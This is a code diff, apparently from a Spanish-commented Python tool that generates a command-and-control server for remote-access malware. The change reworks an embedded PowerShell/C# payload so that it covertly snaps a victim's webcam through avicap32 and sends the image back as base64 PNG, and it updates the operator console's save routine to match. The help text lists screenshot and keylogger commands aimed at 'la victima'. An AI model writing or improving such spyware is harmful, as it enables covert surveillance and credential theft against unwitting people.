@@ -820,7 +820,7 @@ def _generar_c2_server_http(carpeta, lport, xk_hex, nombre_base="kkkk"):
     # ── Webcam: encoded PowerShell via avicap32 (sin dependencias externas) ─
     _wcap_ps = (
         "Add-Type -Language CSharp -TypeDefinition @'\r\n"
-        "using System;using System.IO;using System.Runtime.InteropServices;\r\n"
+        "using System;using System.IO;using System.Drawing;using System.Drawing.Imaging;using System.Runtime.InteropServices;\r\n"
         "public class WCap{\r\n"
         "[DllImport(\"avicap32.dll\")]static extern IntPtr capCreateCaptureWindowA(string n,int f,int x,int y,int w,int h,IntPtr p,int i);\r\n"
         "[DllImport(\"user32.dll\")]static extern bool SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);\r\n"
@@ -836,8 +836,10 @@ def _generar_c2_server_http(carpeta, lport, xk_hex, nombre_base="kkkk"):
         "System.Runtime.InteropServices.Marshal.FreeHGlobal(fp);\r\n"
         "SendMessage(h,0x040B,IntPtr.Zero,IntPtr.Zero);\r\n"
         "if(!File.Exists(t))return \"NOCAM\";\r\n"
-        "var b=File.ReadAllBytes(t);File.Delete(t);\r\n"
-        "return Convert.ToBase64String(b);}\r\n"
+        "var bmp=new Bitmap(t);File.Delete(t);\r\n"
+        "var ms=new MemoryStream();\r\n"
+        "bmp.Save(ms,ImageFormat.Png);bmp.Dispose();\r\n"
+        "return Convert.ToBase64String(ms.ToArray());}\r\n"
         "}\r\n"
         "'@\r\n"
         "[WCap]::Snap()"
@@ -930,7 +932,7 @@ AYUDA = """
 
 \\033[1;33m[ SISTEMA ]\\033[0m
   screenshot           capturar pantalla (guarda PNG en ~/Desktop)
-  webcam_snap          foto de la camara web (guarda BMP en ~/Desktop)
+  webcam_snap          foto de la camara web (guarda PNG en ~/Desktop)
   keyscan_start        activar keylogger en la victima
   keyscan_dump         volcar teclas capturadas (limpia buffer)
   keyscan_stop         desactivar keylogger
@@ -1273,7 +1275,7 @@ def operator():
                     ts   = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                     desk = os.path.join(os.path.expanduser("~"), "Desktop")
                     os.makedirs(desk, exist_ok=True)
-                    fn   = os.path.join(desk, "webcam_" + ts + ".bmp")
+                    fn   = os.path.join(desk, "webcam_" + ts + ".png")
                     with open(fn, "wb") as fh: fh.write(img)
                     print("\\033[1;32m[+] Guardado: " + fn + " (" + str(len(img)//1024) + " KB)\\033[0m")
                 except Exception as ex:
